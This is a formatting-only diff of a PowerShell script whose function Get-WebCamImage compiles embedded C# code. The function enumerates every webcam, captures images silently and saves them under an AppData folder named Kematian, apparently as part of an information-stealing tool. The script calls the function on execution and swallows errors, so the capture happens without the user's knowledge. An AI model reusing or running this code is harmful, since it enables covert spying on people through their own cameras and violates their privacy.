@@ -1,6 +1,6 @@
 function Get-WebCamImage {
     # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
-    $source=@" 
+    $source = @" 
     using System; 
     using System.Collections.Generic; 
     using System.Text; 
@@ -144,9 +144,10 @@ function Get-WebCamImage {
         $picCapture = New-Object System.Windows.Forms.PictureBox 
         try {
             $devices = [WebCamLib.DeviceManager]::GetAllDevices()
-        } catch {
-		Write-Host "[!] No camera found" -ForegroundColor Red		
-		}
+        }
+        catch {
+            Write-Host "[!] No camera found" -ForegroundColor Red        
+        }
         $count = 0
         foreach ($device in $devices) {
             $imagePath = "$env:APPDATA\Kematian\out$count.jpg"
@@ -159,8 +160,9 @@ function Get-WebCamImage {
             [Windows.Forms.Clipboard]::Clear()
         }
 
-    } catch {
-	     Write-Host "[!] No camera found" -ForegroundColor Red	
-	}
+    }
+    catch {
+        Write-Host "[!] No camera found" -ForegroundColor Red    
+    }
 }
-try {Get-WebCamImage} catch {}
+try { Get-WebCamImage } catch {}
